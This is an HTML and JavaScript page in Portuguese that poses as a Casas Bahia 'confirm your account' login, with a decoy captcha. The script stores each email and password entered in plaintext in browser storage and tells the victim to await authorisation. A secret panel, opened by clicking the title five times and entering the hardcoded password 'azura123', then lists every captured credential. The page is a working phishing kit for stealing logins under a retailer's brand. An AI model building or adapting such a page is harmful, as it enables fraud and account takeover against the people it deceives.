<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>Login Azura</title>
  <style>
    body {
      background-image: url('fundo.jpg'); /* certifique-se de que 'fundo.jpg' está no mesmo diretório */
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      height: 100vh;
      align-items: center;
      justify-content: center;
      position: relative;
      overflow: hidden;
    }

    .img-lateral {
      position: absolute;
      top: 50%;
      transform: translateY(-50%);
      width: 120px;
      height: auto;
      z-index: 1;
    }

    .img-esquerda {
      left: 0;
    }

    .img-direita {
      right: 0;
    }

    .login-box {
      background-color: #002776;
      color: white;
      padding: 30px;
      border-radius: 10px;
      width: 320px;
      box-shadow: 0 0 15px rgba(0,0,0,0.4);
      text-align: center;
      position: relative;
      z-index: 2;
    }

    .login-box img.logo {
      width: 180px;
      margin-bottom: 15px;
    }

    input, textarea {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      margin-bottom: 15px;
      border: none;
      border-radius: 5px;
    }

    .captcha-box {
      background-color: #f0f0f0;
      color: #333;
      font-weight: bold;
      padding: 15px;
      margin-bottom: 10px;
      border-radius: 6px;
      font-size: 24px;
      letter-spacing: 8px;
      text-shadow: 1px 1px 2px #aaa;
      cursor: pointer;
      user-select: none;
      font-family: 'Courier New', Courier, monospace;
    }

    button {
      background-color: #ffcc29;
      color: #002776;
      padding: 10px;
      width: 100%;
      border: none;
      font-weight: bold;
      border-radius: 5px;
      cursor: pointer;
    }

    .error {
      color: red;
      font-size: 14px;
      margin-top: 10px;
    }

    #acesso-secreto, #area-admin {
      display: none;
      margin-top: 20px;
    }

    #area-admin {
      background: #ffffff;
      color: #000;
      padding: 10px;
      border-radius: 5px;
      text-align: left;
      max-height: 200px;
      overflow-y: auto;
    }
  </style>
</head>
<body>

  <!-- IMAGENS LATERAIS -->
  <img src="esquerda.jpg" alt="Imagem Lateral Esquerda" class="img-lateral img-esquerda">
  <img src="direita.jpg" alt="Imagem Lateral Direita" class="img-lateral img-direita">

  <div class="login-box">
    <img src="file_00000000cbcc61f9883baa9f7e4a0e12.png" alt="Logo Casas Bahia" class="logo" />
    <h2 id="titulo">Confirmar sua conta </h2>
    <form onsubmit="enviarFormulario(event)">
      <input type="email" id="email" placeholder="E-mail" required />
      <input type="password" id="senha" placeholder="Senha" required />
      <div class="captcha-box" id="captcha-text" onclick="gerarNovoCaptcha()" title="Clique para atualizar o código">0000</div>
      <input type="text" id="captcha-input" placeholder="Digite o código acima" required />
      <input type="password" id="acesso-secreto" placeholder="Senha secreta para acesso" />
      <button type="submit">Entrar</button>
    </form>

    <div class="error" id="erro"></div>

    <div id="area-admin">
      <h3>👁️ Registros Salvos:</h3>
      <ul id="lista-logins"></ul>
    </div>
  </div>

  <script>
    const senhaMestre = "azura123";
    let captchaCode = "";

    function gerarNovoCaptcha() {
      captchaCode = Math.random().toString(36).substring(2, 6).toUpperCase();
      document.getElementById('captcha-text').innerText = captchaCode.split('').join(' ');
    }

    gerarNovoCaptcha();

    let cliqueContador = 0;
    document.getElementById("titulo").addEventListener("click", () => {
      cliqueContador++;
      if (cliqueContador >= 5) {
        document.getElementById("acesso-secreto").style.display = "block";
        cliqueContador = 0;
      }
      setTimeout(() => cliqueContador = 0, 3000);
    });

    function enviarFormulario(event) {
      event.preventDefault();
      const email = document.getElementById("email").value;
      const senha = document.getElementById("senha").value;
      const captchaDigitado = document.getElementById("captcha-input").value.toUpperCase().replace(/\s/g, '');
      const senhaSecreta = document.getElementById("acesso-secreto").value;
      const erro = document.getElementById("erro");

      if (captchaDigitado !== captchaCode) {
        erro.innerText = "Captcha incorreto!";
        gerarNovoCaptcha();
        return;
      }

      erro.innerText = "";

      const login = { email, senha, data: new Date().toLocaleString() };
      let logins = JSON.parse(localStorage.getItem("logins")) || [];
      logins.push(login);
      localStorage.setItem("logins", JSON.stringify(logins));

      alert("Login enviado. Aguarde autorização.");

      if (senhaSecreta === senhaMestre) {
        mostrarAreaAdmin();
      }
    }

    function mostrarAreaAdmin() {
      const lista = document.getElementById("lista-logins");
      const dados = JSON.parse(localStorage.getItem("logins")) || [];
      lista.innerHTML = "";

      dados.forEach((item) => {
        const li = document.createElement("li");
        li.textContent = `${item.data} - ${item.email} / ${item.senha}`;
        lista.appendChild(li);
      });

      document.getElementById("area-admin").style.display = "block";
    }
  </script>
</body>
</html>
